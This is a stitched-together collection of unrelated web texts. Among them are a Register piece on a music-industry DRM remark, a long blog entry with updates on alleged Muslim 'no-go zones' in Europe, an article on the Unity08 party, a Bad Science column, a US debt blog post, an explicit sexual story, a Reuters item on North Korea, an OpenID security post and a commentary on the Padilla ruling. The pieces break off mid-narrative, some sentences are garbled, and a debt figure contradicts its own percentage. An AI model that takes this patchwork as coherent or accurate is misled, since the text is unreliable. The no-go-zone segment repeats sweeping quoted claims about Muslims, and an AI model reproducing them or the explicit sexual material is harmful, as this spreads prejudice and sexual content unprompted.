Mac owners and anyone who runs the Linux operating system should quit whining about DRM and copy - protection technologies that are incompatible with their systems and " consider purchasing a regular CD player " .
That 's the message from Tommi Kyrrä , of the Finnish divison of the International Federation of the Phonographic Industry ( IFPI ) , local - language newssite Tieketone reports this week .
Inflammatory stuff , and comment that quickly provoked a such sufficiently large outcry among Mac and Linux users that Tieketone editors quickly expunged the more controversial part of Kyrrä 's argument .
You can see the two version side by side here .
We 're indebted to Ars Technica 's Ken Fisher for pointing it out to the world .
Kyrrä 's incendiary comment translates into English as :
" Now , we need to understand that listening to music on your computer is an extra privilege .
Normally people listen to music on their car or through their home stereos ...
If you are a Linux or Mac user , you should consider purchasing a regular CD player . "
The irony , that Linux was developed by a Finn , in Finland , appears lost on IFPI Finland 's spokesman .
And who is credited with providing the first solid alternative to illegal downloading from P2P sites ?
A Mac user ...
Kyrrä 's claim that listening to music on a computer is an " extra privilege " is too daft to warrant further comment - if you 're going to penalise , say , Mac users , why not also penalise anyone who buys , say , a Panasonic CD player ?
But it also prompted a silly response from Ars ' Ken .
DRM , he says , is an " encroaching affront to our culture being brought about at the behest of the entertainment industry " .
No , Ken , three - quarters of the rubbish put out on CD each month is an affront to culture .
Do n't get me wrong , I just bought a stack of Judas Priest downloads .
I get a kick out of it , but that does n't make it any less commercial pap .
It 's certainly not culture , and neither is half the stuff people listen to .
Put it in its proper perspective , folks .
Modern music is ephemeral .
It 's ear candy .
There are great records , but for every one that you can and do listen to year in , year out , there are hundreds more that are n't - albums that you could have quite easily left in the shop and your life would be no less rich than it is now .
So an album comes out and it's a copy - protected to the hilt and not supported by your preferred operating system - do n't buy it .
Ignore it - do n't steal it - and spend your hard - earned on something else .
Your life is n't suddenly going to become you do n't own it .
And if you still can't cope , then we 're sure IFPI can find something suitable for you ... ®
[ Author 's note : Please note that the update of Jan. 16 , 2013 substantially changes my understanding of the ZUS . ]
They go by the euphemistic term Zones Urbaines Sensibles , or Sensitive Urban Zones , with the even more antiseptic acronym ZUS , and there are 751 of them as of last count .
They are conveniently listed on one long webpage , complete with street demarcations and map delineations .
What are they ?
Those places in France that the French state does not fully control .
They range from two zones in the medieval town of Carcassonne to twelve in the heavily Muslim city of Marseilles , with hardly a town in France lacking in its ZUS .
The ZUS came into existence in late 1996 and according to a 2004 estimate , nearly 5 million people live in them .
Comment :
The proliferation of ZUS suggest that the French state no longer has full control over its territory .
( November 14 , 2006 )
Nov. 28 , 2006 update :
For an insight into how bad things are , the police in Lyons demonstrated on Nov. 9 , denouncing " violence against the forces of order . "
Things have reached a pretty sad state when the police have to demonstrate in the streets against the criminals .
Jan. 5 , 2008 update :
In a remarkable statement , Michael Nazir - Ali , the Pakistani - born bishop of Rochester , writes in the Daily Telegraph about the situation in Great Britain :
there has been a worldwide resurgence of the ideology of Islamic extremism .
One of the results of this has been to further alienate the young from the nation in which they were growing up and also to turn already separate communities into " no - go " areas where adherence to this ideology has become a mark of acceptability .
Those of a different faith or race may find it difficult to live or work there because of hostility to them .
Jan. 16 , 2008 update : Paul Belien of Brussels Journal provides an update on the ZUS , connecting them to organized crime in a way that helps explain police reluctance to intervene :
In May [ 2007 ] , the French voters elected Mr. [ Nicolas ]
Sarkozy as president because he had promised to restore the authority of the Republic over France 's 751 no - go areas , the so - called zones urbaines sensibles ( ZUS , sensitive urban areas ) , where 5 million people - 8 percent of the population - live .
During his first months in office he has been too busy with other activities , such as selling nuclear plants to Libya and getting divorced .
While the French media publish nude pictures of the future ( third ) Mrs. Sarkozy , the situation in the ZUS has remained as " sensitive " as before .
People get mugged , even murdered , in the ZUS , but the media prefer not to write about it .
When large - scale rioting erupts and officers and firemen are attacked , the behavior of the thugs is condoned with references to their " poverty " and to the " racism " of the indigenous French .
The French media never devote their attention to the bleak situation of intimidation and lawlessness in which 8 percent of the population , including many poor indigenous French , are forced to live .
Muslim racism toward the " infidels " is never mentioned .
Xavier Raufer , a former French intelligence officer who heads the department on organized crime and terrorism at the Institute of Criminology of the University of Paris II , thinks that organized crime has a lot to do with the indifference of the French establishment .
The ZUS are centers of drug trafficking .
According to a recent report of the French government 's Interdepartmental Commission to Combat Drug Traffic and Addiction ( MILDT ) 550,000 people in France consume cannabis on a daily basis and 1.2 million on a regular basis .
The annual cannabis consumption amounts to 208 tons for a market value of 832 million euros ( $ 1.2 billion in U.S. dollars ) .
MILDT estimates that there are between 6,000 and 13,000 small " entrepreneurs " and between 700 and 1,400 wholesalers who make a living out of dealing cannabis .
The wholesalers earn up to 550,000 euros ( $ 820,000 ) per year .
Since they operate from within the ZUS the drug dealers are beyond the reach of the French authorities .
The ZUS exist not only because Muslims wish to live in their own areas according to their own culture and their own Shariah laws , but also because organized crime wants to operate without the judicial and fiscal interference of the French state .
In France , Shariah law and mafia rule have become almost identical .
Mar. 8 , 2008 update : Britain has " ethnic " no - go areas for military personnel in uniform , the Times ( London ) reports today at " Military uniforms in public ' risk offending minorities ' . "
Certain areas in Britain will still have to remain off - limits for servicemen and women in military gear , despite the Government 's desire for a nationwide uniform free - for - all , senior RAF sources acknowledged yesterday .
... one senior air force source said that military commanders had to be aware of potential problems of personnel wearing combat and other military clothes in the street .
" We 're aware of the sensitivities , for example , in some ethnic minority communities which is why we need to have a dialogue with local authorities and police if we do n't want to cause a problem . "
Mar. 16 , 2008 update : John Cornwell , a leading historian and commentator on religion , is generally skeptical of Nazir - Ali's no - go areas but finds that if anyplace fits the profile , it 's Bury Park in Luton :
Luton , like other enclaves , has experienced a spate of incidents that look all too like attempts to make Bury Park a no - go area to non-Muslims .
Between November of last year and last month there were 18 attacks – all registered by the police – on five non-Muslim homes in the area .
One couple , Mr and Mrs Harrop , white residents in their eighties , have had bricks hurled through their windows .
The home of Mrs Palmer , a widow of West Indian origin , aged 70 , has been attacked four times ; on one occasion a metal beer keg crashed through her bay window while she was watching TV .
Such attacks are not typical of the activities of the sort of radicals who preach a global Islamic state , or potential terrorists , who , according to one of my MI5 informants , merge into a background of " innocent normalcy " till the last minute .
DCI Ian Middleton of Bedfordshire police says : " It 's the perception of the victims that their Muslim neighbours are to blame , and we have to respect that .
But we have our doubts . "
Middleton suspects , as does Margaret Moran , MP for Luton South , that the attacks could be the work of small groups of white or Muslim extremists , stirring up racial and inter-religious hatred for its own sake .
I was to come across comparable " no - go " incidents in other parts of Britain , such as threats against Muslim converts to Christianity , and attacks on visiting social workers and Salvation Army facilities .
July 28 , 2008 update : For information on the German case , see Kristian Frigelj , " Unter Feinden , " Die Welt .
The teaser explains that " In many German urban areas , the police hardly dare enter because they are immediately assaulted . "
July 29 , 2008 update :
For a translation of this article , see " In Enemy Territory . "
Jan. 12 , 2009 update : I consider the potential political import of these no - go zones at " Muslim Autonomous Zones in the West ? "
July 19 , 2010 update : Due to problems with Turkish delinquents , German police want their counterparts from Turkey to come in and patrol problem areas of North Rhine - Westphalia .
Also today , Baron Bodissey discusses the general issue of no - go zones at " A Little Piece of Dar al - Islam . "
Aug. 22 , 2011 update : Soeren Kern returns to this subject with an important overview at " European ' No - Go ' Zones for Non-Muslims Proliferating . "
Islamic extremists are stepping up the creation of " no - go " areas in European cities that are off - limits to non-Muslims .
Many of the " no - go " zones function as microstates governed by Islamic Sharia law .
Host - country authorities effectively have lost control in these areas and in many instances are unable to provide even basic public aid such as police , fire fighting and ambulance services .
The " no - go " areas are the by - product of decades of multicultural policies that have encouraged Muslim immigrants to create parallel societies and remain segregated rather than become integrated into their European host nations .
He then surveys developments in the United Kingdom , France , Belgium , Germany , Italy , the Netherlands , and Sweden .
Aug. 4 , 2012 update : The French Interior Ministry has created a new type of no - go zone , called Zones de Sécurité Prioritaires ( ZSP ) , or Priority Security Zones .
The first batch contains 15 of them , basically the Muslim - majority regions of major cities like Lille , Paris , Strasbourg , Lyons , and Marseilles , as well as in French Guyana .
Aug. 24 , 2012 update : Soeren Kern explains these new zones in " France Seeks to Reclaim ' No - Go ' Zones . "
Sep. 1 , 2013 update : 80 ZSP now exist .
Jan. 16 , 2013 update : I had an opportunity today to travel at length to several banlieues ( suburbs ) around Paris , including Sarcelles , Val d'Oise , and Seine - Saint - Denis .
This comes on the heels of having visited over the years the predominantly immigrant ( and Muslim ) areas of Brussels , Copenhagen , Malmö , Berlin , and Athens .
A couple of observations :
For a visiting American , these areas are very mild , even dull .
We who know the Bronx and Detroit expect urban hell in Europe too , but there things look fine .
The immigrant areas are hardly beautiful , but buildings are intact , greenery abounds , and order prevails .
These are not full - fledged no - go zones but , as the French nomenclature accurately indicates , " sensitive urban zones . "
In normal times , they are unthreatening , routine places .
But they do unpredictably erupt , with car burnings , attacks on representatives of the state ( including police ) , and riots .
Having this first - hand experience , I regret having translated what the French government terms Zones Urbaines Sensibles as no-go zones .
One can indeed " go " in them .
A typical sight in the commercial areas of " 94 , " one of the most heavily Muslim areas of France .
Typical housing .
Nov. 11 , 2013 update : Andrew Harrod discusses the problems in Bonn at " Germany 's Sharia No - Go Zones . "
Oct. 1 , 2014 update : The Swedish police published a report on 55 areas of heightened criminal activity under the anodyne title of En nationell översikt av kriminella nätverk med stor påverkan i lokalsamhället ( " A national survey of criminal networks with great influence in the local community " ) .
No ethnicity is mentioned but many happen to be regions with Muslim majorities .
Jan. 13 , 2015 update : Nigel Farage , leader of the United Kingdom Independence Party , says that most big French cities have " no - go zones " where non-Muslims , including police , cannot enter :
It 's happening right across Europe .
We have got no - go zones in most of the big French cities .
We 've been turning a blind eye to preachers of hate that have been coming here from the Middle East and saying things for which the rest of us would be arrested .
In parts of northern England we 've seen the sexual grooming of under - age girls committed by Muslim men , in the majority , and for all of these things we are seeing the law not being applied equally , we 're seeing the police forces not doing their job because we 've suffered from moral cowardice .
We have through mass immigration and through not checking the details of those people who have come to our countries , we have allowed big ghettos to develop and when it comes to confronting tough issues we 're run a mile and that is why we 're in the mess we 're in , we 've been led very badly .
...
So , wherever you look , wherever you look you see this blind eye being turned and you see the growth of ghettos where the police and all the normal agents of the law have withdrawn and that is where Sharia law has come in . "
He added that he is " hoping and praying " that similar no - go zones do not develop in British cities .
Jan. 14 , 2015 update : Jack Sommers , a UK - based reporter for Huffington Post , posed this series of questions to me about the ZUS and their equivalents elsewhere in Europe :
Could you describe the places you visited in more detail ?
What were your impressions of these places before you visited them ?
Did you feel personally safe visiting them ?
Do you think there is any truth to the claims being made that police and non-Muslims fear to visit them ?
My reply :
​ I have visited predominantly immigrant ( and largely Muslim ) areas of Athens , Berlin , Brussels , Copenhagen , the Hague , Malmö , Paris , and Stockholm . ​
In the case of Paris , I spent time both in Belleville and in such suburbs as Sarcelles , Val d'Oise , and Seine Saint Denis .
I have also visited the equivalent areas of Dearborn , Michigan , and Sydney , Australia , plus analogous areas of Israel , including Jaffa , Nazareth , eastern Jerusalem , Baqa al - Gharbiya , and Umm al - Fahm .
Before my travels , I expected these areas to be similar to the worst areas of the United States , such as the Bronx or Detroit , where buildings are decrepit , streets menacing , and outsiders feel distinctly unwelcome .
My experiences starting in 2007 belied this expectation .
All the immigrant areas turned out to be well maintained , with safe streets , and no sense of intimidation .
I walked around , usually with camera in hand , and felt at ease .
I encountered no difficulties at all .
That said , there is a reason why the French government calls these regions sensibles ( sensitive , delicate ) .
They contain many social pathologies ( unemployment , drugs , political extremism ) , they seethe with antagonism toward the majority society , and are prone to outbreaks of violence .
So , from an American point of view , these areas are a bit confusing : potentially dangerous , yes , but in normal times very ordinary looking and with no sense of foreboding .
Thus , the term no - go zone does not accurately reflect the situation .
Jan. 16 , 2015 update : I reply to a critique that my visits do not amount to evidence at http://www.danielpipes.org/comments/220430
Jan. 17 , 2015 update : Research into the term no - go zones referring to Muslim habitations in Western Europe done by the pseudonymous Yoel Natan finds its earliest use to be on my website , DanielPipes.org :
An Australia resident who calls himself " fed up " wrote on March 22 , 2006 , that " In Sydney , Australia , we have large areas of our city that are deemed no - go zones . "
The next use appears to be by the Norwegian analyst who calls himself Fjordman , on July 13 , 2006 , who defined " Muslim no - go zones " as places " where anything representing a Western institution ( post office truck , firemen , even mail order delivery firms ) was routinely ambushed with Molotov cocktails . "
Then came my use of the term on November 14 , 2006 .
My originality was in translating Zones Urbaines Sensibles as no-go zones .
Jan. 20 , 2015 update : I offer a more skeptical view of the ZUS today at " Does Europe Have No-go Zones ? " in The Blaze .
Dec. 2 , 2015 update : I offer another – my third , more nuanced , and , I hope , final – assessment of the no - go - zone issue today at " Muslim ' No - go Zones ' in Europe ? " in the Daily Caller .
In it , I settle on the term " partial no - go zones . "
As the evening wore on , a sense of frustration pervaded the gathering , until finally Jordan exclaimed , “ Why are you guys just writing a book ?
Ca n’t we do something about this ?
The country is in serious trouble here ! ”
And then came the leap .
The three decided on the spot that they would create a third party to represent the center in the 2008 presidential election .
To guarantee that it would , they decided that the ticket itself would be bipartisan : one Democrat and one Republican .
And if independents with bipartisan tendencies were interested , they ’d be welcome , too .
They called their new party “ Unity08 ” and resolved that it would operate on the Internet .
That way everyone could join the party online and participate as a delegate , helping to build the party ’s platform collectively rather than ceding that task to interest groups , as both major parties tend to do .
Ultimately , they hoped , these delegates would select a presidential and vice - presidential candidate in an online convention to be held in 2008 , just after the major - party primaries determined the Republican and Democratic nominees .
This will be a period of maximal importance to Unity08 ’s founders , who believe that many voters will be dissatisfied with the available choices , and that ambitious candidates — Republicans and Democrats who did n’t quite make it , as well as independents — will seriously consider a third - party alternative .
Bailey had been experimenting for years with the Internet applications of politics , in a series of civic - minded youth projects he ’d embarked on after retiring from politics .
All of the founders recognized that this new technology was poised to transform politics , just as greatly as television had in their own era .
They had seen television ’s effect on the political process grow more and more pernicious as the years went by , poisoning the dialogue while forcing candidates to raise ever - greater sums of money to pay for it .
They recognized that the Internet , in its political infancy , was a force that could still be shaped for good .
The three parted ways that evening scarcely believing what they ’d decided to do .
But in the months ahead , as they studied the feasibility of their plan , they became convinced it could work .
Being political consultants , they commissioned a national poll to examine the mood of the electorate and gauge its willingness to accept an independent party .
The nation appeared willing indeed : 82 percent of respondents agreed that the country was too polarized to make progress solving problems , and three - quarters wanted more choices than just the Democratic and Republican candidates .
The three persuaded Roger Craver , a pioneer in the field of cause - oriented fund - raising , to join them with the object of financing the effort through online donations , and they recruited an executive committee to raise a $ 1 million bridge fund .
They also hired the prominent Washington law firm of Steptoe and Johnson to advise them on ballot access in all fifty states .
To establish the appearance of sober competence , they enlisted the actor Sam Waterston , a friend of Rafshoon ’s best known for his role as a principled district attorney on the television show Law & Order , to appear in Internet promotions .
“ I ’m one of those people who have been watching politics from the outside with a typical mix of horror and fascination , ” Waterston told me recently .
“ The idea is so simple , yet if it works , it ’s one of those things that will change the direction of the river . ”
Talk about bad science here .
· I have a very long memory .
So often with " science by press release " , newspapers will cover a story , even though the scientific paper does n't exist , assuming it 's around the corner .
In February 2004 , the Daily Mail was saying that cod liver oil is " nature 's superdrug " .
The Independent wrote : " They 're not yet saying it can enable you to stop a bullet or leap tall buildings , but it 's not far short of that . "
These glowing stories were based on a press release from Cardiff University , describing a study looking at the effect of cod liver oil on some enzymes - no idea which - that have something to do with cartilage - no idea what .
I had no way of knowing whether the study was significant , valid or reliable .
Nobody did , because it was n't published .
No methods , results , conclusions to appraise .
Nothing .
· In 1998 Dr Arpad Pusztai announced through the telly that genetically modified potatoes " caused toxicity to rats " .
Everyone was extremely interested in this research .
So what had he done in his lab ?
What were they fed ?
What had he measured ?
A year later the paper was published , and it was significantly flawed .
Nobody had been able to replicate his data and verify the supposed danger of GM because we had n't seen the write - up , the academic paper .
How could anyone examine , let alone have a chance to rebut , Pusztai 's claims ?
Peer review is just the start : then we have open scrutiny , by the scientific community , and independent replication .
· So anyway , I wrote at the time that these cod liver oil people in Cardiff University were jolly irresponsible , that patients would worry , GPs would have no answer for them , and so on ( www.tinyurl.com/cxenh).
So this week I contacted Cardiff and said : this is what I said last year , now where 's the paper ?
Prof John Harwood responded through the press office : " Mr Goldacre is quite right in asserting that scientists have to be very certain of their facts before making public statements or publishing data . "
I 'm a doctor , but it 's good to know we agree .
If puzzling .
· " Because of that , Professor Caterson and my laboratory are continuing to work on samples . "
Right ... " I 'm afraid this takes a long time and much longer than journalists or public relations firms often realise .
So , I regret he will have to be patient before Professor Caterson or myself are prepared to comment in detail . "
How kind .
And only slightly patronising .
I do n't want them to comment on fish oil .
It 's 17 months after " nature 's superdrug " : I want to know where the published paper is .
· Please send your bad science to bad.science@theguardian.com
And the result of this is simple :
Once again , debt issuance is increasing at an alarming rate .
Do n't believe a liberal blogger ?
Fine .
Go to the Bureau of Public Debt .
According to the them the US ’ total debt on September 30 , 2001 was $ 5,807,463,412,200.06 .
This total was $ 8,506,974,000.00 on September 30 2006 , for an increase of 46.47 % .
Over the same period ( September 30 , 2001 to September 30 , 2006 ) , total US GDP increased from $ 10.135 trillion to $ 13.322 trillion or an increase of 31.44 % .
In other words , the debt is increasing faster than US GDP -- and not by a small , statistically insignificant amount .
Debt is increasing about 15 % faster than GDP over the last 6 years .
In addition , the US debt / GDP ratio has increased from 57.29 % in September 2001 to 63.84 % in September 2006 .
Over the last 4 years , the US Treasury has issued over $ 550 billion in net new debt per year for the last 4 years .
At this point , the supply - side will offer the following response : " But Bonddad !
The deficit is decreasing ! "
Well --- yes , but only if you think Enron style accounting is a valid way to report the Federal government 's situation .
The oft - quoted decrease in the deficit is the result of including the Social Security surplus in the calculations .
The problem with this is instead of actually saving that money the government is spending it .
When you go to the Bureau of Public Debt , you will notice that increase in " intra - governmental debt " .
Think of this as money that should be in the Social Security Trust Fund that instead is being spent on other things .
Basically , Bush is using Social Security taxes to pay for Iraq .
So we have a situation where the top 10 % are getting literally everything they want .
And everybody else gets hosed .

It 's late Thursday night - well , early Friday morning - the week after Thanksgiving , and at Warren 's invitation , I stop by his place after my shift at the Bar .
He lets me in the front door of his apartment , looking very much like a man awakened from restful sleep - but then a few seconds later , he 's got me up against the wall and he 's kissing me and frantically undoing my jeans .
It 's about four in the morning , and he has to be awake and starting his day in less than three hours , but he gets down on his knees , pulls off half my clothing , and starts going down on me right there in the entry hallway .
All by themselves , the shock and his urgency get me halfway home within seconds , and I cry out a little .
My knees shake and I press myself hard up against the wall , grabbing hold of his head .
In reply he grabs my ass and holds tight , and starts bringing me the rest of the way home .
He 's learned quickly - very quickly - what I like and why , and God , there 's just nothing like someone who 's bothered to figure out exactly what the best way is to go down on you .
It must take several minutes , I know it must , but it feels like almost no time at all has passed before my breathing quickens , my grip on his head tightens , and he redoubles his efforts exactly where they will do the most good - and I can't stay on my feet anymore , I feel myself sliding slowly down the wall , Warren 's hands still gripping my ass , his mouth locked in place , and a scream rising in my throat .
I end up sitting on the floor , and I grab my jeans from where they landed and stuff a handful of beer - tasting denim in my mouth just before it hits , and then I cry out loud enough to wake Levi Strauss from the dead .
As I sit there catching my breath , exhausted and shaking , Warren stands up , calmly walks to his apartment door - and finally closes it .
I did n't even notice it had still been open .
I throw my jeans at him .
" You sonofabitch , someone could have seen that !
" He shakes his head .
" Floor show 's not included with the monthly maintenance . "
He crouches down , and with a little effort but not much , scoops me into his arms , stands up , and carries me to his room , where he throws me onto his bed from a few feet away .
When he joins me , I strip him down and do for him what he 's done for me .
He 's a little hard to read sometimes , but that 's true of a lot of men - it 's tough for them to ask for what they want , they think it makes them look weak or picky or something .
But my ex Peter once told me that when it comes to going down on guys , effort and enthusiasm go a long way even when technique and preferences might be a question - mark .
And the way I 've been treated tonight , I 've got enthusiasm to spare .
He does n't last long - not even as long as I did .
We 're lying there a few minutes later , curled up together , my head on his shoulder , when I feel his arm twitch a little and sense a change in his breathing .
" No you do n't , " I say , shaking him .
" There 's a condom in the pocket of my jeans , and we 're not breaking Chekhov 's Law tonight .
" He laughs .
" What ? " " Chekhov 's Law of economy in narrative .
If there 's a gun on stage in the first act , it has to be fired by the end of the third act . " " Fucking English major , " he says , shaking his head .
" That 's right , I 'm aEnglish major , and you 're aexecutive , so do n't fall asleep on me !
" He rolls over on top of me and starts making out with me , and by about ten minutes later , he 's ready to go , and we do .
It 's the slow and deliberate passion of two people who are wiped out already , and it 's beautiful .
Three or four times as he comes kind of close , we just pause where we are and hold each other tight , with him still inside of me , for a few minutes at a time .
It 's like this for somewhere in the neighborhood of a half hour .
We pause one more time .
This has been building up in me for days .
I may never forgive myself , but I can't help myself .
"
You need more than this , do n't you ? " I ask him .
" What ?
No , I 'm loving this , we 're both tired , do n't force it .
"
" No , you need more than this - more than great sex , laughs , companionship .
"
He looks me in the eye .
" We 're doing this now ? " " Sorry .
" Warren sighs .
" I want to be settled .
I want to get married again someday , and I want my kids to have a woman in their lives when they 're with me , not just when they 're with their mother .
"
" And you see that happening with me ? " " I see it as a very real possibility , Debra .
I 'm too old and I have too many responsibilities to be chasing girls for the hell of it .
You do n't see it ?
" It 's the strangest feeling , having a man inside of me at the same moment I 'm realizing that it 's almost certainly the last time he 'll be there .
I look into his eyes , and I search my heart , but I know I wo n't find anything there that has n't been there already these last couple of months .
The tears start flowing even before I start shaking my head .
He cradles my head with his hands , and rocks me for a minute .
Soon I wipe my tears away , then I kiss his ear , his neck , and his mouth , and what little size he 's lost inside me in the last few minutes starts to come back .
We 're still making love when his alarm goes off at 6:30 , and we laugh as he turns it off .
We pause as he gets close to climax again and we hold each other tightly .
" You 're going to be late for work , " I whisper .
" Yes , I am , " he replies .
And then we start again .
SEOUL ( Reuters ) - A South Korean intelligence official said on Wednesday that increased activity had been spotted at North Korea ’s nuclear reactor , which local media has said could suggest it is being closed down .
A satellite image shows a nuclear facility in Yongbyon , North Korea September 29 , 2004 .
Contrary to published reports , the United States has seen no signs that North Korea has begun to shut down its Yongbyon nuclear facility as called for in a February 13 six - country agreement , a senior U.S , official said on Tuesday .
REUTERS / Digital Globe
A U.S. official , however , said that Washington had not seen any sign North Korea had begun mothballing its Yongbyon nuclear plant -- source of weapons - grade plutonium -- as required under a February 13 disarmament agreement .
“ We have seen unusual activity around the nuclear reactor so we are currently following and analyzing this , ” said a National Intelligence Service official , who asked not to be named .
But he added the government did not conclude that this meant , as some local media reports had suggested , that Pyongyang was taking steps to finally shut down the reactor .
The Dong - A Ilbo daily earlier quoted intelligence sources as saying satellite photographs showed increased vehicle and personnel movements near the secretive state ’s reactor site .
The U.S. official , who spoke on condition of anonymity , said news reports in South Korean media are “ just not accurate ...
We have seen no actions on the North Koreans ’ part that at this point leads us to believe they are fulfilling their part of the 60 - day actions ” .
Under the February 13 agreement reached by the two Koreas , China , Japan , Russia and the United States , Pyongyang had until last Saturday to start the shutdown and invite back U.N. nuclear inspectors .
However , it has refused until it can access funds frozen for more than a year in a Macau bank .
South Korean President Roh Moo-hyun said on Wednesday that the last - minute haggling over when North Korea will start closing the nuclear plant would be resolved .
“ There were some unpredictable technical problems that have delayed implementation .
Both sides are making efforts and those problems are almost resolved , ” Roh told a news conference .
“ The delay will not nullify the agreement , ” he said .
South Korean officials went to Pyongyang for economic talks with the North , with Seoul indicating it could hold off on sending rice aid to its neighbor that battles chronic food shortages if Pyongyang does not start shutting the reactor .
South Korea cut off its regular food handouts after the North test fired missiles in July .
The North stormed out of their last economic meeting shortly after that in anger over the aid cut .
Tim Bray has an excellent post entitled OpenID which attempts to separate hype from fact when it comes to the technorati's newest darling , OpenID .
He writes
The buzz around OpenID is becoming impossible to ignore .
If you do n't know why , check out How To Use OpenID , a screencast by Simon Willison .
As it 's used now ( unless I 'm missing something ) OpenID seems pretty useless , but with only a little work ( unless I 'm missing something ) it could be very useful indeed .
Problem : TLS ·
The first problem is that OpenID does n't require the use of TLS ( what 's behind URIs that begin with https : ) .
...
Problem : What 's It Mean ?
· Another problem with OpenID is that , well , having one does n't mean very much ; just that you can verify that some server somewhere says it believes that the person operating the browser owns that ID .
...
Problem : Phishing ·
This is going to be a problem , but I do n't think it 's fair to hang it on OpenID , because it 's going to be equally a problem with any browser - based authentication .
Since browser - based authentication is What The People Want , we 're just going to have to fight through this with a combination of browser engineering and ( more important ) educating the general public
...
The Real Problem ·
Of course , out there in the enterprise space where most of Sun 's customers live , they think about identity problems at an entirely different level .
Single - sign - on seems like a little and not terribly interesting piece of the problem .
They lose sleep at night over " Attribute Exchange " ; once you have an identity , who is allowed to hold what pieces of information about you , and what are the right protocols by which they may be requested , authorized , and delivered ?
The technology is tough , but the policy issues are mind - boggling .
So at the moment I suspect that OpenID is n't that interesting to those people .
I 've been thinking about OpenID from the context of authorization and sharing across multiple social networks .
Until recently I worked on the authorization platform for a lot of MSN Windows Live properites ( i.e. the platform that enables setting permissions on who can view your Windows Live Space , MSN Calendar , or Friends list from Windows Live Messenger ) .
One of the problems I see us facing in the future is lack of interoperability across multiple social networks .
This is a problem when your users have created their friend lists ( i.e. virtual address books ) on sites like Facebook , Flickr or MySpace .
One of the things you notice about these services is that they all allow you to set permissions on who can view your profile or content .
More importantly , if your profile / content is non-public then they all require that the people who can view your profile must have an account with their service .
We do the same thing across Windows Live so it is n't a knock on them .
What I find interesting is this ; what if on Flickr I could add http://mike.spaces.live.com as a contact then give Mike Torres permission to view my photos without him having to get a Yahoo ! account ?
Sounds interesting does n't it ?
Now let 's go back to the issues with OpenID raised by Tim Bray .
The first thing to do is to make sure we all have the same general understanding of how OpenID works .
It 's basically the same model as Microsoft Passport Windows Live ID , Google Account Authentication for Web - Based Applications and Yahoo !
Browser Based Authentication .
A website redirects you to your identity provider , you authenticate yourself ( i.e. login ) on your identity providers site and then are redirected back to the referring site along with your authentication ticket .
The ticket contains some information about you that can be used to uniquely identify you as well as some user data that may be of interest to the referring site ( e.g. username ) .
Now we have a high level understanding of how it all works , we can talk about Tim Bray 's criticisms .
TLS / SSL
On the surface it makes sense that identity providers should use SSL when you login to your account after being redirected there by a service that supports OpenID .
However as papers like TrustBar : Protecting ( even Naïve ) Web Users from Spoofing and Phishing Attacks , SSL / TLS does little to prevent the real security problems on the Web today , namely Web page spoofing ( i.e. Phishing ) and the large amount of malware on user PCs which could be running key loggers .
This is n't to say that using SSL / TLS is n't important , just that it 's like putting bars on your windows and leaving the front door open .
Thus I can understand why it is n't currently required that identity providers support SSL / TLS .
However a little security is better than no security at all .
What Does It Mean ?
I agree with Tim Bray that since OpenID is completely decentralized , websites that support it will likely end up creating whitelists of sites they want to talk to otherwise they risk their systems being polluted by malicious or inconsiderate OpenID providers .
See Tim Bray 's example of creating http://www.tbray.org/silly-id/
which when queried about any OpenID beginning with that URI instantly provides a positive response without authenticating the user .
This allows multiple people to claim http://www.tbray.org/silly-id/BillGates for example .
Although this may be valid if one was creating the OpenID version of BugMeNot , it is mostly a nuisance to service providers that want to accept OpenID .
Phishing
Using susceptibility to phishing as an argument not to use OpenID seems like shutting the barn door when the horse has already bolted .
The problem is that security conscious folks do n't want users getting used to the idea of providing their username and password for one service whenever prompted by another service .
After all , the main lesson we 've been trying to teach users about preventing phishing is to only enter their username and password to their primary sites when they type them in themselves not when they follow links .
OpenID runs counter to this teaching .
However the problem with that teaching is that users are already used to doing this several times a day .
Here are three situations from this morning where I 've been asked to enter my username and password from one site on another
Given the proliferation of this technique in various contexts on the Web today , it seems partisan to single out OpenID as having problems with phishing .
If anything , THE WEB has a problem with phishing which needs to be solved by the browser vendors and the W3C who got us in this mess in the first place .
Attribute Exchange
This usually goes hand in hand with any sort of decentralized / federated identity play .
So let 's say I can now use my Windows Live ID to login to Flickr .
What information should Flickr be able to find out about me from talking to Windows Live besides my username ?
Should I be able to control that or should it be something that Flickr and Windows Live agree on as part of their policies ?
How is the user educated that the information they entered in one context ( i.e. in Windows Live ) may be used in a totally different context on another site .
As Tim Bray mentioned in his post , this is less of a technology issue and more a policy thing that will likely differ for enterprises versus " Web 2.0 " sites .
That said , I 'm glad to see that Dick Hardt of Sxip Identity has submitted a proposal for OpenID Attribute Exchange 1.0 which should handle the technology aspect of the problem .
Disclaimer :
This is not an endorsement of OpenID by Microsoft or an indication of the future direction of authentication and authorization in Windows Live .
This is me brainstorming some ideas in my blog and seeing whether the smart folks in my reader base think these ideas make sense or not .

The presiding judge in the José Padilla case has held that the Sixth Amendment ’s guarantee of a speedy trial does not protect American citizens from being indefinitely incarcerated by the Pentagon .
Padilla had filed a motion to dismiss the case on the ground that the federal government had denied him his right to a speedy trial .
Padilla has been in custody since May 2002 and his trial , which is scheduled to begin in April , is not being held until some five years later .
From May 2002 until January 2006 , Padilla was held in U.S. military custody as an enemy combatant in the war on terror . 
In January 2006 , the Pentagon chose to transfer custody of Padilla to the U.S. Justice Department , which had indicted Padilla on terrorism charges in U.S. District Court .
( Ever since 9/11 , U.S. officials have had the option of treating people suspected of terrorism either as enemy combatants  or as federal - court defendants . )
Last Friday , the presiding judge in the case , Marcia Cooke , denied Padilla ’s motion to dismiss .
The judge held that when a person , including an American citizen , is held in custody by the Pentagon as an enemy combatant ,  the time does n’t start running with respect to his right to a speedy trial .
It begins running , she held , only when he becomes part of the federal criminal - justice system .
Gee , I wonder if the judge ’s reasoning applies to the rest of the Bill of Rights as well .
Maybe the First Amendment does n’t apply if it ’s the Pentagon that is suppressing speech and assembly as part of its perpetual war on terror . 
Or maybe the Second Amendment prohibits only the Bureau of Alcohol , Tobacco , Firearms and Explosives ( ATF ) , not the Pentagon , from seizing guns from the American people , as it is doing as part of the war on terror in Iraq .
Our 18th - century American ancestors would have found Judge Cooke ’s ruling to be ludicrous .
If a military department of government is exempt from the restrictions of the Bill of Rights , then the entire executive branch is exempt for the obvious reason :
Whenever the government wants to exempt itself from the Bill of Rights , all it has to do is employ the military to do the dirty deed .
The purpose of the Bill of Rights was to protect the American people from the federal government , not a particular department of the federal government .
What Judge Cooke obviously fails to recognize is the deep antipathy to militarism and to an enormous standing military force that characterized our American ancestors .
Unlike Judge Cooke , they understood the tremendous threat to the freedom and well - being of the American people that militarism and a standing army would pose .
